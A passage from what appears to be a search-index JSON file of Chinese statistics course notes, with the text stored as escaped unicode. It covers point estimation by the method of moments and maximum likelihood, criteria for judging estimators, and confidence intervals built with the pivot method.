<p>\u4e0a\u9762\u53ea\u662f\u7528\u4e86\u539f\u70b9\u77e9\uff0c\u5199\u9898\u4e2d\u8fd8\u7ecf\u5e38\u7528\u5230\u4e2d\u5fc3\u77e9\u8ba1\u7b97\uff0c\u539f\u7406\u548c\u6b65\u9aa4\u76f8\u540c</p> <p>\u4f8b 1\uff1a</p> <p>\u8bbe\u603b\u4f53 \\(X\\sim U(a,b)\\) \uff0ca,b \u4e3a\u672a\u77e5\u53c2\u6570\uff0c\u6837\u672c \\(X_1,..., X_n\\) \uff0c\u6c42 a \u548c b \u7684\u77e9\u4f30\u8ba1\u3002</p> <p>\u89e3\u7b54\uff1a</p> <p>&lt;1&gt; \u6c42\u77e9\u5173\u4e8e\u53c2\u6570\u7684\u51fd\u6570\uff1a</p> \\[ \\mu_1 =E(X)= \\frac{a+b}{2},\\ \\ v_2=Var(X) = \\frac{(a-b)^2}{12} \\] <p>&lt;2&gt; \u6c42\u5404\u53c2\u6570\u5173\u4e8ek\u9636\u77e9\u7684\u53cd\u51fd\u6570\uff1a</p> \\[ a=\\mu_1 -\\sqrt{3v_2}, \\ \\ b=\\mu_1 +\\sqrt{3v_2} \\] <p>&lt;3&gt; \u4ee5\u6837\u672c\u539f\u70b9\u77e9 \\(A_1= \\bar{X}\\) \u4ee3\u66ff\u603b\u4f53\u5404\u9636\u77e9 \\(\\mu_1\\)\uff0c\u6837\u672c\u4e2d\u5fc3\u77e9 \\(B_2 = \\frac{1}{n}\\sum_{i=1}^n (X-\\bar{X}) ^2\\) \u4ee3\u66ff\u603b\u4f53\u4e2d\u5fc3\u77e9 \\(v_2\\) \uff0c\u5f97\u5230\u53c2\u6570 a,b \u7684\u77e9\u4f30\u8ba1\uff1a</p> \\[ \\hat{a} = \\bar{X} -\\sqrt{3B_2},\\ \\ \\hat{b} = \\bar{X} + \\sqrt{3B_2} \\]"},{"location":"Courses/PS/CH7/#_4","title":"\u6700\u5927\u4f3c\u7136\u6cd5","text":"<p>\u6781\u5927\u4f3c\u7136\u6cd5\u7684\u57fa\u672c\u601d\u60f3: \u8bbe\u67d0\u4e8b\u4ef6 A \u53d1\u751f\u7684\u6982\u7387\u4f9d\u8d56\u4e8e\u5f85\u4f30\u53c2\u6570 \\(\\theta\\) , \u5982\u679c\u89c2\u5bdf\u5230 A \u5df2\u7ecf\u53d1\u751f, \u90a3\u4e48\u5c31\u53d6\u4f7f\u5f97\u4e8b\u4ef6 A \u53d1\u751f\u7684\u6982\u7387\u8fbe\u5230\u6700\u5927\u7684 \\(\\theta\\) \u7684\u503c\u4f5c\u4e3a \\(\\theta\\) \u7684\u4f30\u8ba1\u3002</p> <p>\u5f53 \\(X\\) \u4e3a\u8fde\u7eed\u578b\u603b\u4f53\u65f6\uff0c\u8bbe\u5176\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(f(x;\\theta)\\) \uff0c\\(\\theta \\in \\Theta\\) \u662f\u672a\u77e5\u7684\u5f85\u4f30\u53c2\u6570\uff0c\\(X_1,..., X_n\\) \u662f\u6765\u81ea\u603b\u4f53\u7684\u968f\u673a\u6837\u672c\uff0c\u5e76\u8bbe \\(x_1,..., x_n\\) \u662f\u5df2\u5f97\u5230\u7684\u6837\u672c\u503c\uff0c\u5219\u4f3c\u7136\u51fd\u6570\u5b9a\u4e49\u4e3a\uff1a</p> \\[ L(\\theta) = L(\\theta ; x_1, x_2,..., x_n) =\\prod_{i=1} ^n f(x_i;\\theta) \\] <p>\u5f62\u5f0f\u4e0e\u6837\u672c\u7684\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\u76f8\u540c \\(f(x_1, x_2,..., x_n; \\theta)\\) \u76f8\u540c\u3002\u53c2\u6570\u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u503c\u4e3a\u4f3c\u7136\u51fd\u6570\u53d6\u6700\u5927\u503c\u7684\u60c5\u51b5\uff1a</p> \\[ L(\\hat{\\theta}) =L(\\hat{\\theta} ; x_1,..., x_n) = \\max_{\\theta\\in \\Theta} L(\\theta; x_1,..., x_n) \\] <p>\u79f0\u76f8\u5e94\u7684\u7edf\u8ba1\u91cf \\(\\hat{\\theta}(X_1, ...,X_n)\\) \u4e3a \\(\\theta\\) \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u91cf\uff0c\u7b80\u79f0 MLE\u3002</p> <p>\u5bf9\u4e8e\u79bb\u6563\u578b\u603b\u4f53</p> \\[L(\\theta) = L(\\theta ; x_1, x_2,..., x_n) =\\prod_{i=1} ^n p (x_i;\\theta)\\] <p>\u5bfb\u6c42\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u65f6\u5e38\u7528\u5fae\u5206\u6cd5\uff0c\u6709\u4f3c\u7136\u65b9\u7a0b\uff1a</p> \\[ \\frac{dL(\\theta)}{d\\theta}|_{\\theta = \\hat{\\theta}} =0 \\] <p>\u4e3a\u4e86\u8ba1\u7b97\u65b9\u4fbf\uff0c\u5f80\u5f80\u5bf9\u4f3c\u7136\u65b9\u7a0b\u53d6\u5bf9\u6570\uff0c\u8bb0\u4e3a\u5bf9\u6570\u4f3c\u7136\u51fd\u6570\uff1a</p> \\[ l(\\theta) =\\ln L(\\theta) \\] <p>\u5219\u4e0a\u5f0f\u7b49\u4ef7\u4e8e\uff1a</p> \\[ \\frac{dl(\\theta)}{d\\theta} |_{\\theta = \\hat{\\theta}} = 0 \\] <p>\u82e5\u6709\u591a\u4e2a\u5f85\u4f30\u53c2\u6570\uff0c\u5219\u9700\u8981\u5bf9\u6bcf\u4e2a\u53c2\u6570\u5206\u522b\u6c42\u504f\u5bfc</p> <p>\u6709\u65f6\u5019\u9047\u89c1\u6c42\u5bfc\u65e0\u96f6\u70b9\uff0c\u5219\u6c42\u6700\u5927\u503c\u5bf9\u5e94\u7684\u70b9\u5373\u53ef\uff0c\u4f46\u662f\u8981\u6ce8\u610f \\(\\theta\\) \u7684\u53d6\u503c\u8303\u56f4</p> \\[\\begin{array}c X\\sim U(0,\\theta) \\\\ L(\\theta) = \\begin{cases} \\frac{1}{\\theta ^n}, &amp; 0\\le x_1,...,x_n \\le \\theta \\\\ 0, &amp; \\text{\u5176\u4ed6}\\end{cases} \\\\ \\text{\u53c2\u6570\u8d8a\u5c0f\uff0c\u4f3c\u7136\u65b9\u7a0b\u8d8a\u5927\uff0c\u4f46\u662f\u6709 } \\theta \\ge \\max (x_1, ...,x_n) \\\\ \\Rightarrow \\hat{\\theta} = \\max (x_1,..., x_n)\\end{array}\\] <p>\u4f8b 1\uff1a</p> <p>\u8bbe\u603b\u4f53\u670d\u4ece\u6cca\u677e\u5206\u5e03 \\(X\\sim P(\\lambda)\\) \uff0c\u5176\u4e2d \\(\\lambda\\) \u662f\u672a\u77e5\u53c2\u6570\uff0c\u82e5 \\(X_1, X_2, ...,X_n\\) \u662f\u6765\u81ea\u603b\u4f53\u7684\u6837\u672c\uff0c\u6c42\u53c2\u6570 \\(\\lambda\\) \u7684\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u91cf\u3002</p> <p>\u89e3\u7b54\uff1a</p> \\[\\begin{array}c L(\\lambda) =\\prod _{i=1}^n p(x_i; \\lambda) =\\prod_{i=1}^n \\frac{\\lambda ^{x_i}}{ x_i!}e^{-\\lambda} = \\frac{\\lambda ^{\\sum_{i=1} ^n x_i}}{ \\prod_{i=1}^n x_i!} e^{-n\\lambda} \\\\ \\Rightarrow l(\\lambda) = \\left(\\sum_{i=1}^n x_i \\right)\\ln \\lambda -\\sum_{i=1}^n x_i! -n\\lambda \\\\ \\frac{dl(\\lambda)}{d\\lambda}|_{\\lambda=\\hat{\\lambda}} = 0,\\ \\ \\text{\u6b64\u65b9\u7a0b\u6709\u552f\u4e00\u89e3\uff1a} \\\\ \\hat{\\lambda} = \\frac{1}{n} \\sum_{i=1}^n X_i = \\bar{X} \\end{array}\\] <p>\u4f8b 2\uff1a</p> <p>\u8bbe\u603b\u4f53\u670d\u4ece\u6b63\u6001\u5206\u5e03 \\(X\\sim N(\\mu, \\sigma^2)\\) \uff0c\u6c42\u672a\u77e5\u53c2\u6570 \\(\\mu, \\sigma^2\\) \u7684\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u91cf:</p> <p></p> <p>\u5b9e\u9645\u4e0a\u8fd8\u8981\u5bf9\u4f3c\u7136\u65b9\u7a0b\u6c42\u4e8c\u9636\u5bfc\u770b\u662f\u5426\u5c0f\u4e8e0\uff0c\u4ee5\u786e\u5b9a\u8fd9\u662f\u6781\u5927\u503c</p> <p>\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u7684\u4e0d\u53d8\u539f\u7406 \u5df2\u7ecf\u4f30\u8ba1\u51fa\u53c2\u6570\uff0c\u5219\u5bf9\u5176\u7edf\u8ba1\u91cf\u7684\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u53ef\u4ee5\u76f4\u63a5\u5e26\u5165\u8fd9\u4e9b\u53c2\u6570\u3002</p> <p>\u4f8b\u5982\uff0c\u5747\u5206\u5206\u5e03 \\(E(X)\\) \u7684\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u4e3a \\(\\frac{\\hat{a} +\\hat{b}}{2}\\)\u3002</p>"},{"location":"Courses/PS/CH7/#_5","title":"\u4f30\u8ba1\u91cf\u7684\u8bc4\u4ef7\u51c6\u5219","text":""},{"location":"Courses/PS/CH7/#_6","title":"\u65e0\u504f\u6027","text":"<p>\u4f30\u8ba1\u91cf\u672c\u8eab\u662f\u7edf\u8ba1\u91cf\uff0c\u5176\u53d6\u503c\u968f\u7740\u6837\u672c\u503c\u6539\u53d8\u800c\u6539\u53d8\uff0c\u56e0\u6b64\u6211\u4eec\u4e0d\u80fd\u6839\u636e\u67d0\u6b21\u62bd\u6837\u7684\u7ed3\u679c\u6765\u8861\u91cf\u4f30\u8ba1\u91cf\u7684\u597d\u574f\u3002\u4e00\u4e2a\u81ea\u7136\u8bc4\u4ef7\u6807\u51c6\u662f\u8981\u6c42\u4f30\u8ba1\u91cf\u65e0\u7cfb\u7edf\u504f\u5dee\uff0c\u5373\u8981\u6c42\u5728\u5927\u91cf\u91cd\u590d\u62bd\u6837\u65f6\uff0c\u6240\u6709\u4f30\u8ba1\u503c\u7684\u5e73\u5747\u503c\u5e94\u4e0e\u5f85\u4f30\u53c2\u6570\u7684\u771f\u503c\u76f8\u540c\uff0c\u8fd9\u5c31\u662f\u65e0\u504f\u6027\u51c6\u5219\u3002</p> <p>\u8bbe \\(\\theta \\in \\Theta\\) \u662f\u603b\u4f53\u7684\u5f85\u4f30\u53c2\u6570\uff0c\\(X_1, X_2,..., X_n\\) \u662f\u6765\u81ea\u603b\u4f53\u7684\u6837\u672c\uff0c\u82e5\u4f30\u8ba1\u91cf \\(\\hat{\\theta}\\) \u7684\u6570\u5b66\u671f\u671b\u5b58\u5728\uff0c\u4e14\u6ee1\u8db3\uff1a</p> \\[ E(\\hat{\\theta}) = \\theta , \\ \\ \\  \\forall \\theta \\in \\Theta  \\] <p>\u79f0 \\(\\hat{\\theta}\\) \u4e3a \\(\\theta\\) \u7684\u65e0\u504f\u4f30\u8ba1\u3002</p> <p>\u5982\u679c \\(\\hat{\\theta}\\) \u662f\u4e00\u4e2a\u6709\u504f\u4f30\u8ba1\uff0c\u4e14\u6709 \\(E(\\hat{\\theta})=a\\theta +b\\) \uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u65e0\u504f\u7ea0\u6b63\u5f97\u5230 \\(\\theta\\) \u7684\u65e0\u504f\u4f30\u8ba1\uff1a</p> \\[ \\frac{1}{a}(\\hat{\\theta} - b) \\] <p>Info</p> <ul> <li>\u82e5 \\(E(\\hat{\\theta}) \\ne \\theta\\) \uff0c\u5219\u79f0 \\(E(\\hat{\\theta}) - \\theta\\) \u4e3a\u4f30\u8ba1\u91cf \\(\\hat{\\theta}\\) \u7684\u504f\u5dee</li> <li>\u82e5 \\(E(\\hat{\\theta}) \\ne \\theta\\) \uff0c\u4f46 \\(\\lim _{n\\rightarrow +\\infty}E(\\hat{\\theta}) = \\theta\\) \uff0c\u5219\u79f0 \\(\\hat{\\theta}\\) \u662f \\(\\theta\\) \u7684\u6e10\u8fd1\u65e0\u504f\u4f30\u8ba1</li> </ul> <ul> <li>\u6837\u672c\u5747\u503c \\(\\bar{X}\\) \u548c\u6837\u672c\u65b9\u5dee \\(S^2\\) \u5206\u522b\u662f \\(\\mu\\) \u548c \\(\\sigma^2\\) \u7684\u65e0\u504f\u4f30\u8ba1</li> <li>\u6837\u672c\u4e8c\u9636\u4e2d\u5fc3\u8ddd \\(B_2\\) \u662f \\(\\sigma^2\\) \u7684\u6e10\u8fd1\u65e0\u504f\u4f30\u8ba1</li> </ul>"},{"location":"Courses/PS/CH7/#_7","title":"\u6709\u6548\u6027","text":"<p>\u6709\u4e9b\u60c5\u51b5\u4e0b\uff0c\u540c\u4e00\u603b\u4f53\u53c2\u6570\u53ef\u80fd\u6709\u591a\u4e2a\u65e0\u504f\u4f30\u8ba1\u91cf\uff0c\u4e3a\u6bd4\u8f83\u65e0\u504f\u4f30\u8ba1\u91cf\u7684\u597d\u574f\uff0c\u6211\u4eec\u9700\u8fdb\u4e00\u6b65\u8003\u5bdf\u4f30\u8ba1\u91cf\u53d6\u503c\u7684\u65b9\u5dee\u3002\u4f30\u8ba1\u91cf\u65b9\u5dee\u8d8a\u5c0f\uff0c\u8bf4\u660e\u8be5\u4f30\u8ba1\u91cf\u7684\u53d6\u503c\u8d8a\u96c6\u4e2d\u5728\u53c2\u6570\u771f\u503c\u9644\u8fd1\u3002</p> <p>\u8bbe \\(\\hat{\\theta_1} =\\hat{\\theta_1} (X_1, X_2, ...,X_n)\\) \u4e0e \\(\\hat{\\theta_2} =\\hat{\\theta_2} (X_1, X_2, ...,X_n)\\) \u90fd\u662f\u53c2\u6570 \\(\\theta\\) \u7684\u65e0\u504f\u4f30\u8ba1\uff0c\u82e5 \\(\\forall \\theta \\in \\Theta\\)\uff0c\\(Var_\\theta( \\hat{\\theta_1}) \\le Var_\\theta (\\hat{\\theta_2})\\)\uff0c\u4e14\u81f3\u5c11\u6709\u4e00\u4e2a \\(\\theta \\in \\Theta\\) \u4f7f\u4e0d\u7b49\u53f7\u6210\u7acb\uff0c\u5219\u79f0 \\(\\hat{\\theta_1}\\) \u6bd4 \\(\\hat{\\theta_2}\\) \u6709\u6548\u3002</p> <p>\u8fd8\u662f\u5bf9\u5747\u5300\u5206\u5e03 \\(U(0,\\theta)\\) \u7684\u53c2\u6570 \\(\\theta\\) \u8fdb\u884c\u5206\u6790\uff1a</p> <ul> <li>\u77e9\u4f30\u8ba1\uff1a \\(\\hat{\\theta} = 2\\bar{X}\\)</li> <li>\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\uff1a \\(\\hat{\\theta} = \\max (X_1, ...,X_n)\\)</li> </ul> <p>\u65e0\u504f\u6027\uff1a</p> <ul> <li>\u77e9\u4f30\u8ba1\uff1a \\(E(\\hat{\\theta}) = 2 E(\\bar{X}) = \\theta\\) <ul> <li>\u6240\u4ee5\u662f\u53c2\u6570 \\(\\theta\\) \u7684\u65e0\u504f\u4f30\u8ba1\uff0c\u4e0d\u9700\u8981\u7ea0\u6b63</li> </ul> </li> <li>\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\uff1a \\(E(\\hat{\\theta}) = \\frac{n}{n+1}\\theta\\)<ul> <li>\u6240\u4ee5\u662f\u53c2\u6570 \\(\\theta\\) \u7684\u6709\u504f\u4f30\u8ba1\uff0c\u9700\u8981\u7ea0\u6b63\u4e3a \\(\\frac{n+1}{n}\\hat{\\theta}\\)</li> </ul> </li> </ul> <p>\u6709\u6548\u6027\uff1a</p> <ul> <li>\u77e9\u4f30\u8ba1\uff1a \\(D(\\hat{\\theta})= 4\\cdot \\frac{\\sigma^2}{n} = \\frac{\\theta^2}{3n}\\)</li> <li>\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\uff1a \\(D(\\hat{\\theta}) = \\frac{\\theta^2}{n(n+2)}\\)</li> </ul> <p>\u6240\u4ee5\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u7684\u6709\u6548\u6027\u66f4\u597d\u3002</p>"},{"location":"Courses/PS/CH7/#_8","title":"\u5747\u65b9\u8bef\u5dee","text":"<p>\u8bbe \\(\\hat{\\theta} = \\hat{\\theta} (X_1, X_2,..., X_n)\\) \u662f\u603b\u4f53\u53c2\u6570\u7684\u4f30\u8ba1\u91cf\uff0c\u79f0 \\(E[(\\hat{\\theta} - \\theta)^2]\\) \u662f\u4f30\u8ba1\u91cf \\(\\hat{\\theta}\\) \u7684\u5747\u65b9\u8bef\u5dee\uff0c\u8bb0\u4e3a \\(Mse(\\hat{\\theta})\\) \u3002</p> <p>\u8bbe \\(\\hat{\\theta}_1\\) \u548c \\(\\hat{\\theta}_2\\) \u90fd\u662f \\(\\theta\\) \u7684\u4f30\u8ba1\u91cf\uff0c\u82e5\u5bf9\u4e8e\u4efb\u610f \\(\\theta \\in \\Theta\\)\uff0c\\(Mse(\\hat{\\theta}_1) \\le Mse(\\hat{\\theta}_2)\\) \uff0c\u4e14\u5b58\u5728\u67d0\u4e2a \\(\\theta\\) \u4f7f\u4e0d\u7b49\u53f7\u6210\u7acb\uff0c\u5219\u79f0\u5728\u5747\u65b9\u8bef\u5dee\u51c6\u5219\u4e0b \\(\\hat{\\theta}_1\\) \u4f18\u4e8e \\(\\hat{\\theta}_2\\) \u3002</p> \\[ Mse(\\hat{\\theta}) =Var(\\hat{\\theta}) +[E(\\hat{\\theta}) - \\theta]^2 \\] <p>\u65e0\u504f\u4f30\u8ba1\u91cf\u7684\u5747\u65b9\u8bef\u5dee</p> <p>\u5bf9\u4e8e\u65e0\u504f\u4f30\u8ba1\u91cf\uff0c\\(Mse(\\hat{\\theta})= Var(\\hat{\\theta})\\)\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u4e24\u4e2a\u65e0\u504f\u4f30\u8ba1\u91cf\u6765\u8bf4\uff0c\u5747\u65b9\u8bef\u5dee\u51c6\u5219\u7b49\u4ef7\u4e8e\u6709\u6548\u6027\u51c6\u5219</p>"},{"location":"Courses/PS/CH7/#_9","title":"\u76f8\u5408\u6027","text":"<p>\u8bbe \\(\\hat{\\theta} = \\hat{\\theta} (X_1, X_2,..., X_n)\\) \u662f\u603b\u4f53\u53c2\u6570\u7684\u4f30\u8ba1\u91cf\uff0c\u82e5\u5bf9\u4efb\u610f \\(\\varepsilon \\gt 0\\)\uff0c\u6709\uff1a</p> \\[ \\lim _{n \\to +\\infty} P\\{ |\\hat{\\theta}_n -\\theta|\\lt \\varepsilon\\} =1 \\] <p>\u5373 \\(\\hat{\\theta}_n\\) \u4f9d\u6982\u7387\u6536\u655b\u4e8e \\(\\theta\\) \uff0c\u5219\u79f0 \\(\\hat{\\theta}_n\\) \u662f \\(\\theta\\) \u7684\u76f8\u5408\u4f30\u8ba1\u91cf\uff0c\u5e76\u8bb0\u4e3a \\(\\hat{\\theta}_n \\xrightarrow P \\theta,\\ n\\to +\\infty\\)</p> <p>\u4e00\u822c\u77e9\u6cd5\u6c42\u5f97\u7684\u4f30\u8ba1\u91cf\u90fd\u6ee1\u8db3\u76f8\u5408\u6027\uff1b\u5bf9\u4e8e\u6781\u5927\u4f3c\u7136\u4f30\u8ba1, \u5728\u603b\u4f53\u5206\u5e03\u6ee1\u8db3\u4e00\u5b9a\u7684\u6761\u4ef6\u4e0b, \u6c42\u5f97\u7684\u4f30\u8ba1\u91cf\u4e5f\u662f\u5f85\u4f30\u53c2\u6570\u7684\u76f8\u5408\u4f30\u8ba1\u91cf</p> <p>\u4f8b 1\uff1a</p> \\[ f(x:\\theta) =\\begin{cases} \\frac{1}{\\theta}e^{- \\frac{x}{\\theta}} , &amp; x\\gt 0 \\\\ 0, &amp; \\text{\u5176\u4ed6}\\end{cases} \\] <ul> <li>\uff081\uff09\u5728\u5f62\u5982 \\(c\\sum_{i=1}^n X_i\\) \u7684\u4f30\u8ba1\u4e2d\u6c42c\uff0c\u4f7f\u5176\u5728\u5747\u65b9\u8bef\u5dee\u51c6\u5219\u4e0b\u6700\u4f18\u3002</li> <li>\uff082\uff09\u5224\u65ad\u4e0a\u9762\u5f97\u5230\u7684\u4f30\u8ba1\u91cf\u662f\u5426\u4e3a \\(\\theta\\) \u7684\u76f8\u5408\u4f30\u8ba1\u91cf\u3002</li> </ul> \\[\\begin{array}l c\\sum_{i=1}^n X_i &amp; = cn\\hat{\\theta} \\\\ Mse(cn\\hat{\\theta}) &amp; = E[(cn\\hat{\\theta} - \\theta)^2] \\\\  &amp; = E^2 (cn\\hat{\\theta} -\\theta) +D(cn\\hat{\\theta} -\\theta) \\\\  &amp; = [cnE(\\hat{\\theta}) -\\theta]^2 +c^2 n^2 D(\\hat{\\theta}) \\\\  &amp; = c^2 n^2 E^2(\\hat{\\theta}) - 2cn\\theta E(\\hat{\\theta}) + c^2 n^2 \\frac{1}{n} D(X)+ \\theta^2 \\\\  &amp; = \\theta^2 [(n^2+n) c^2 -2cn +1] \\end{array}\\] \\[ \\text{\u6240\u4ee5 } c=\\frac{1}{n+1} \\text{\u65f6} Mse \\text{\u53d6\u5f97\u6700\u5c0f\u503c}\\] <p>\u5bf9\u4e8e\u76f8\u5408\u4f30\u8ba1\u91cf\u7684\u5224\u65ad\uff0c\u5e94\u7528\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\uff1a</p> \\[ P\\{(\\frac{n}{n+1}\\hat{\\theta} - \\theta)\\lt \\varepsilon\\} \\ge 1- \\frac{Var(\\frac{n}{n+1}\\hat{\\theta})}{\\varepsilon^2} = 1- \\frac{n\\theta^2}{(n+1)^2 \\varepsilon^2}\\to 1 \\]"},{"location":"Courses/PS/CH7/#_10","title":"\u533a\u95f4\u4f30\u8ba1","text":""},{"location":"Courses/PS/CH7/#_11","title":"\u5b9a\u4e49","text":"<p>\u4eba\u4eec\u5e38\u5e38\u6839\u636e\u70b9\u4f30\u8ba1\u5bf9\u603b\u4f53\u53c2\u6570\u4f5c\u51fa\u5224\u65ad\uff0c\u4f46\u8fd9\u79cd\u5224\u65ad\u7684\u628a\u63e1\u6709\u591a\u5927\uff1f\u53ef\u4fe1\u5ea6\u6709\u591a\u9ad8\uff1f\u70b9\u4f30\u8ba1\u65e0\u6cd5\u56de\u7b54\u8fd9\u4e9b\u95ee\u9898\u3002\u7edf\u8ba1\u5b66\u5bb6\u4e3a\u4e86\u5f25\u8865\u6b64\u79cd\u4e0d\u8db3\uff0c\u63d0\u51fa\u4e86\u533a\u95f4\u4f30\u8ba1\u3002</p> <p>\u5bf9\u4e8e\u5f85\u4f30\u53c2\u6570 \\(\\theta \\in \\Theta\\) \uff0c\u5176\u6709\u4e24\u4e2a\u7edf\u8ba1\u91cf \\(\\hat{\\theta}_1 =\\hat{\\theta}_1 (X_1, X_2, ..., X_n) \\lt \\hat{\\theta}_2 = \\hat{\\theta}_2 (X_1, X_2,..., X_n)\\)\uff0c\u4e14\u5bf9\u4e8e\u7ed9\u5b9a\u7684 \\(\\alpha \\in (0,1)\\) \u548c\u4efb\u610f \\(\\theta \\in \\Theta\\)\uff0c\u6709\uff1a</p> \\[ P\\{\\hat{\\theta}_1 \\lt \\theta \\lt \\hat{\\theta}_2\\} \\ge 1- \\alpha \\] <p>\u5219\u79f0\u968f\u673a\u533a\u95f4 \\((\\hat{\\theta}_1 , \\hat{\\theta}_2)\\) \u4e3a\u53c2\u6570 \\(\\theta\\) \u7684\u7f6e\u4fe1\u6c34\u5e73\u4e3a \\(1-\\alpha\\) \u7684\u7f6e\u4fe1\u533a\u95f4\u3002</p> <p>\u7f6e\u4fe1\u6c34\u5e73 \\(1-\\alpha\\) \u8d8a\u5927\uff0c\u7f6e\u4fe1\u533a\u95f4\u8d8a\u957f\uff08\\(\\alpha\\) \u8d8a\u5c0f\uff0c\u8981\u6ce8\u610f\uff09</p> <p>\u7edf\u8ba1\u91cf \\(\\hat{\\theta}_1\\) \u548c \\(\\hat{\\theta}_2\\) \u5206\u522b\u79f0\u4e3a\u53cc\u4fa7\u7f6e\u4fe1\u4e0b\u9650\u548c\u53cc\u4fa7\u7f6e\u4fe1\u4e0a\u9650\uff1b\u4e0e\u4e4b\u76f8\u5bf9\u7684\uff0c\u7f6e\u4fe1\u6c34\u5e73\u4e3a \\(1-\\alpha\\) \u7684\u5355\u4fa7\u7f6e\u4fe1\u4e0b\u9650\uff08\u4e0a\u9650\uff09\u4e3a\uff1a</p> \\[\\begin{array}l P\\{\\hat{\\theta}_1 \\lt \\theta\\} \\ge 1-\\alpha, &amp;\\theta \\in \\Theta \\\\ P\\{\\theta \\lt \\hat{\\theta}_2\\} \\ge 1-\\alpha, &amp;\\theta \\in \\Theta \\\\ \\end{array} \\] <p>Lemma \u8bbe\u7edf\u8ba1\u91cf \\(\\hat{\\theta}_1\\) \u548c \\(\\hat{\\theta}_2\\) \u5206\u522b\u4e3a\u53c2\u6570 \\(\\theta\\) \u7684\u7f6e\u4fe1\u6c34\u5e73\u4e3a \\(1-\\alpha_1\\) \u548c \\(1-\\alpha_2\\) \u7684\u5355\u4fa7\u7f6e\u4fe1\u4e0a\u4e0b\u9650\uff0c\u90a3\u4e48 \\((\\hat{\\theta}_1 , \\hat{\\theta}_2)\\) \u4e3a\u53c2\u6570 \\(\\theta\\) \u7684\u7f6e\u4fe1\u6c34\u5e73\u4e3a \\(1-\\alpha_1 -\\alpha_2\\) \u7684\u7f6e\u4fe1\u533a\u95f4\u3002</p> <p>\u5948\u66fc\u539f\u5219</p> <p>\u79f0\u7f6e\u4fe1\u533a\u95f4\u7684\u5e73\u5747\u957f\u5ea6 \\(E(\\hat{\\theta}_2 -\\hat{\\theta}_1)\\) \u4e3a\u7f6e\u4fe1\u533a\u95f4\u7684\u7cbe\u786e\u5ea6\uff0c\u7531\u5b9a\u4e49\u53ef\u77e5\uff0c\u5f53\u6837\u672c\u5bb9\u91cf \\(n\\) \u7ed9\u5b9a\u65f6\uff0c\u7f6e\u4fe1\u6c34\u5e73\u8d8a\u9ad8\uff0c\u7cbe\u786e\u5ea6\u8d8a\u4f4e\u3002\u56e0\u6b64\u6211\u4eec\u5728\u786e\u5b9a\u4e00\u5b9a\u7684\u7f6e\u4fe1\u6c34\u5e73\u524d\u63d0\u4e0b\uff0c\u5c3d\u53ef\u80fd\u63d0\u9ad8\u7cbe\u786e\u5ea6\u3002\u5982\u82e5\u603b\u4f53 \\(X\\) \u662f\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5219\u6211\u4eec\u5c1d\u8bd5\u4f7f \\(P\\{\\hat{\\theta}_1 \\lt \\theta \\lt \\hat{\\theta}_2\\}\\) \u7b49\u53f7\u6210\u7acb\u3002</p>"},{"location":"Courses/PS/CH7/#_12","title":"\u67a2\u8f74\u91cf\u6cd5","text":"<p>\u67a2\u8f74\u91cf\uff08Pivot\uff09\u4e3a\u5206\u5e03\u5b8c\u5168\u5df2\u77e5\u3001\u4e14\u5f62\u5f0f\u4e0a\u4e0d\u4f9d\u8d56\u4e8e\u5176\u5b83\u672a\u77e5\u53c2\u6570\u7684\u51fd\u6570\uff0c\u901a\u5e38\u5f62\u5f0f\u4e3a \\(G(X_1, X_2, ...,X_n;\\theta)\\) \u3002</p> <p>\u901a\u8fc7\u67a2\u8f74\u91cf\u6cd5\u6c42\u7f6e\u4fe1\u533a\u95f4\u7684\u6b65\u9aa4\u901a\u5e38\u5206\u4e3a\u4e09\u6b65\uff1a</p> <p>\uff081\uff09\u6784\u9020\u4e00\u4e2a\u5df2\u77e5\u7684\u67a2\u8f74\u91cf \\(G(X_1, X_2, ...,X_n;\\theta)\\)\uff1b</p> <p>\uff082\uff09\u9009\u53d6\u9002\u5f53\u5e38\u6570 \\(a,b\\) \uff0c\u4f7f\u5f97 \\(b -a\\) \u6700\u5c0f\uff0c\u4e14\u6ee1\u8db3\uff1a</p> \\[ P_\\theta \\{a\\lt G(X_1, X_2, ...,X_n;\\theta) \\lt b\\} = 1-\\alpha \\] <p>\uff083\uff09\u5c06\u53c2\u6570 \\(\\theta\\) \u4ece\u51fd\u6570\u4e2d\u5206\u79bb\u51fa\u6765\uff0c\u7b49\u4ef7\u8f6c\u6362\u4e3a\uff1a</p> \\[ P\\{\\hat{\\theta}_1 \\lt \\theta \\lt \\hat{\\theta}_2\\} = 1- \\alpha \\] <p>\u4e60\u60ef\u4e0a\uff0c\u6211\u4eec\u5e38\u53d6 \\(a,b\\) \u4e3a</p> \\[P_\\theta\\{G(X_1, X_2, ...,X_n;\\theta) \\le a\\}=P_\\theta\\{G(X_1, X_2, ...,X_n;\\theta) \\ge b\\}= \\frac{\\alpha}{2}\\]"},{"location":"Courses/PS/CH7/#_13","title":"\u6b63\u6001\u603b\u4f53\u53c2\u6570\u7684\u533a\u95f4\u4f30\u8ba1","text":""},{"location":"Courses/PS/CH7/#_14","title":"\u5355\u4e2a\u6b63\u6001\u603b\u4f53","text":"<p>\u5747\u503c \\(\\mu\\) \u7684\u7f6e\u4fe1\u533a\u95f4</p> <p>\u82e5\u603b\u4f53\u65b9\u5dee \\(\\sigma^2\\) \u5df2\u77e5\uff0c\u5219\u53ef\u4ee5\u6784\u9020\u51fd\u6570 \\(\\frac{\\bar{X}-\\mu}{\\sigma / \\sqrt{n}} \\sim N(0,1)\\) \uff0c\u5f0f\u4e2d\u4ec5\u6709\u4e00\u4e2a\u672a\u77e5\u53c2\u6570 